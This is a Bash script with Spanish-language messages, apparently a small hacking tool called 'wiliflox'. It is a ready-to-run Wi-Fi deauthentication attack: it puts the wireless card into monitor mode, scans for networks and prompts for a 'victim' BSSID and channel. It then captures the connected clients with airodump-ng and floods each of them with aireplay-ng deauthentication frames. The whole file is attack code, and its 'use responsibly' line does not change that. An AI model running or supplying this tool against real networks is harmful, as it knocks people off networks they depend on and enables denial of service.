#!/usr/bin/env bash
clear
#Zona de colores 
#by s4vitar
#------------------------------------------------------
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"
#------------------------------------------------------

#variables globales
#-------------------------------------------------------
interface="$(sudo wpa_cli interface | tail -n 1 | sed 's/ //g')"
#-----------------------------------------------------


#Zona de funciones
#----------------------------------------------------------------
trap ctrl_c INT
function ctrl_c(){
	printf "\n\n${yellowColour}[*]${endColour}${grayColour} Escapando....\n${endColour}"
	sudo ifconfig $interface down
	sudo iwconfig $interface mode Managed
	sudo ifconfig $interface up
	escape
}

modo_monitor ()
{
printf "${yellowColour}[#]${endColour}${greenColour} Configurando modo monitor ${endColour}\n"
sleep 1
sudo ifconfig $interface down
sudo iwconfig $interface mode monitor
sudo ifconfig $interface up
inicio_ataque
}

olfateo ()
{
sudo airodump-ng --bssid $1 --channel $2 --write captura $interface &
sleep 5
sudo killall airodump-ng 
sleep 1
ataque
}
ataque ()
{
sleep 1
printf "${yellowColour}[>:)]${endColour}${greenColour} Desautenticando usuarios ${endColour}\n"
sleep 1
var=2
while [ $(echo "hola") ]; do
lineas=$var
resultado="$(cat captura-01.csv | tail -n $lineas | cut -b 3 | head -n 1)"
	if [ "$resultado" = ":" ]; then
	direccion=$(cat captura-01.csv | tail -n $lineas | cut -b 1-17 | head -n 1)
	sudo aireplay-ng --deauth 1000000  -a $victima -c $direccion $interface &>/dev/null&
	else
	sleep 
        printf "${redColour}[>:)]${endColour}${grayColour} Los usuarios fueron desautenticados ${endColour}\n"
        sleep 1
	printf "${redColour}[>:)]${endColour}${grayColour} Presione ctrl + c para salir cuando lo desee ${endColour}\n"
        sleep 1000000
	break
	fi
let "var++"

done
escape
}

inicio_ataque ()
{
sleep 1
printf "${yellowColour}[#]${endColour}${purpleColour} Escaneando redes.... ${endColour}\n"
sleep 1
sudo airodump-ng $interface &
sleep 2
sudo killall airodump-ng
printf "${yellowColour}[@]${endColour}${grayColour} Ingrese el ${purpleColiour}BSSID de su${endColour}${endColour}${redColour} victima: ${endColour}"
read victima
printf "${yellowColour}[@]${endColour}${grayColour} Ingrese el canal ${endColour}${redColour}(CH)${endColour}${grayColour} de su ${endColour}${redColour} victima: ${endColour}"
read canal
olfateo $victima $canal
}

dependencias ()
{
if [ $(command -v aircrack-ng) ]; then
printf "${greenColour}[*]${endColour}${grayColour} Usted posee todos los paquetes necesarios${endColour}\n"
modo_monitor
else
printf "${redColour}[!]${endColour}${grayColour} Usted no posee los paquetes necesarios${endColour}\n"
sleep 1
printf "${redColour}[!]${endColour}${grayColour} Paquetes necesarios para funcionar: ${endColour}\n"	
printf "${purpleColour}- net-tools${endColour}\n"
printf "${purpleColour}- aircrack-ng${endColour}\n"
sleep 2
escape
fi
}

escape ()
{
clear
printf "${greenColour}[*]${endColour}${grayColour} Muchas gracias por ocupar la herramienta wiliflox${endColour}\n"
sleep 1
printf "${greenColour}[*]${endColour}${turquoiseColour} Creador: franpro660${endColour}\n"
sleep 1
printf "${greenColour}[*]${endColour}${turquoiseColour} Agradecimientos especiales: ${endColour}\n"
sleep 1
printf "${greenColour}[*]${endColour}${blueColour} Aedes ${endColour}\n"
exit 0
}

inicio ()
{
printf "${yellowColour}[*]${endColour}${grayColour} Bienvenido a la herramienta wiliflox${endColour}\n"
sleep 1
printf "${yellowColour}[*]${endColour}${grayColour} Porfavor ejecute este comando con permisos ${endColour}${redColour}Root${endColour}${grayColour} para evitar problemas\n"
sleep 1
printf "${yellowColour}[*]${endColour}${grayColour} Esta herramienta fue hecha en bash.${endColour}\n"
sleep 1
printf "${yellowColour}[*]${endColour}${grayColour} Esta orientada a desautenticar a todos los usuarios de una red en especifico${endColour}\n"
sleep 1
printf "${redColour}[!]${endColour}${grayColour} Porfavor ocupar responsablemente${endColour}\n"
sleep 1
printf "${blueColour}[*]${endColour}${grayColour} Revisando paquetes necesarios.......${endColour}\n"
sleep 1
}
#----------------------------------------------------
#Fin zona de funciones

#Main
#---------------------
inicio
dependencias
#---------------------
